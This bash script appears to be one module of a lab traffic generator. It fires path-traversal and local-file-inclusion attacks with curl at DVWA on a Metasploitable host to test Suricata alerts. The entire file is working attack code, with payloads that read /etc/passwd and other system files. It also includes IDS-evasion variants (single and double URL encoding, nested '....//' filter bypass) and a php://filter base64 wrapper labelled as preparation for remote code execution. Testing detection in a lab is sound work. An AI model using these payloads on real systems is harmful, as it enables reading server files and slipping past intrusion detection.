#!/bin/bash

# =================================================================
# MODULE 06: PATH TRAVERSAL (FILE INCLUSION) - PAYLOAD ROTATION
# Strategy: 3 Level Depth (Basic, Encoding, Wrapper/Filter)
# Input: Receives argument $1 as the Round Number
# =================================================================

# Receive Input Round Number from Daily Round
ROUND=${1:-1} # Default to round 1 if empty

# CONFIGURATION
TARGET_IP="192.168.x.x"   # Replace with your Metasploitable IP
# Insert a valid PHPSESSID from the browser
COOKIE="security=low; PHPSESSID=replace_with_your_session_id"
LOG_FILE="logs/trav_session_$(date +%F).log"

# Vulnerable DVWA URL
BASE_URL="http://$TARGET_IP/dvwa/vulnerabilities/fi/?page="

# Colors for Report Display
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# =================================================================
# PAYLOAD ROTATION LOGIC (PAYLOAD DIVERSITY)
# Changes the evasion technique (Level 2) and target file (Level 3)
# =================================================================
if [ "$ROUND" -le 10 ]; then
    # --- SET A (Round 1-10) ---
    # Level 2: Standard URL Encode
    # ../ -> ..%2f
    PAYLOAD_L2="..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
    DESC_L2="Evasion: URL Encoding (Standard)"

    # Level 3: Wrapper target passwd
    FILE_L3="etc/passwd"

elif [ "$ROUND" -le 20 ]; then
    # --- SET B (Round 11-20) ---
    # Level 2: Double URL Encode
    # % -> %25, so %2f -> %252f
    PAYLOAD_L2="%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
    DESC_L2="Evasion: Double URL Encoding"

    # Level 3: Wrapper target group (file variation)
    FILE_L3="etc/group"

else
    # --- SET C (Round 21-30) ---
    # Level 2: Nested Traversal
    # ....// -> becomes ../ after single filtering
    PAYLOAD_L2="....//....//....//....//....//etc/passwd"
    DESC_L2="Evasion: Nested Traversal (Filter Bypass)"

    # Level 3: Wrapper target hosts (file variation)
    FILE_L3="etc/hosts"
fi

echo "[+] [06_TRAV] Starting Path Traversal Module..."
echo "[+] Target Base URL: $BASE_URL"
echo "[+] Mode: Round $ROUND ($DESC_L2)"

# Check cookie
if [[ "$COOKIE" == *"replace_with"* ]]; then
   echo -e "${RED}[!] WARNING: Cookie not set yet! The script may fail to log in to DVWA.${NC}"
   sleep 3
fi

# -----------------------------------------------------------------
# LEVEL 1: BASIC TRAVERSAL (NOISY - BASELINE)
# Goal: Baseline. Test detection of the standard "../" traversal pattern.
# Payload: ../../../../../etc/passwd (fixed)
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 1] Running Basic Traversal (/etc/passwd)...${NC}"

PAYLOAD="../../../../../etc/passwd"
FULL_URL="${BASE_URL}${PAYLOAD}"

# DISPLAY REPORT
echo -e "${YELLOW}    [Payload Path]   : $PAYLOAD${NC}"
echo -e "${YELLOW}    [Full URL]       : $FULL_URL${NC}"
echo -e "${YELLOW}    [Technique Info] : Accessing a sensitive file using a relative path${NC}"

# Execute
curl -s -b "$COOKIE" "$FULL_URL" -o logs/trav_lvl1_r${ROUND}.txt
echo "    -> Completed. (Expected: ET WEB_SERVER /etc/passwd access alert)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 2: ENCODED TRAVERSAL (EVASION - DYNAMIC)
# Goal: Test Suricata's URI decoding capability.
# Technique: Use the dynamic payload variable ($PAYLOAD_L2).
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 2] Running $DESC_L2...${NC}"

# Use the PAYLOAD_L2 variable, which changes by round
FULL_URL="${BASE_URL}${PAYLOAD_L2}"

# DISPLAY REPORT
echo -e "${YELLOW}    [Payload Encoded]: $PAYLOAD_L2${NC}"
echo -e "${YELLOW}    [Technique Info] : Testing IDS decoding capability${NC}"

# Execute
curl -s -b "$COOKIE" "$FULL_URL" -o logs/trav_lvl2_r${ROUND}.txt
echo "    -> Completed. (Expected: Evasion detection or still flagged as LFI)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 3: PHP WRAPPER (LFI to RCE PREPARATION - DYNAMIC)
# Goal: Test detection of the PHP protocol (php://filter).
# Technique: Use 'php://filter' with a varying target file ($FILE_L3).
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 3] Running PHP Filter Wrapper (Target: $FILE_L3)...${NC}"

# PHP wrapper payload; target file varies by round
PAYLOAD="php://filter/convert.base64-encode/resource=../../../../../$FILE_L3"
FULL_URL="${BASE_URL}${PAYLOAD}"

# DISPLAY REPORT
echo -e "${YELLOW}    [Payload Wrapper]: $PAYLOAD${NC}"
echo -e "${YELLOW}    [Technique Info] : Using the php:// protocol to wrap the target file${NC}"

# Execute
curl -s -b "$COOKIE" "$FULL_URL" -o logs/trav_lvl3_r${ROUND}.txt
echo "    -> Completed. (Expected: ET WEB_SERVER PHP wrapper alert)"

echo "[+] [06_TRAV] Module Finished at $(date)"
echo "-----------------------------------------------------------"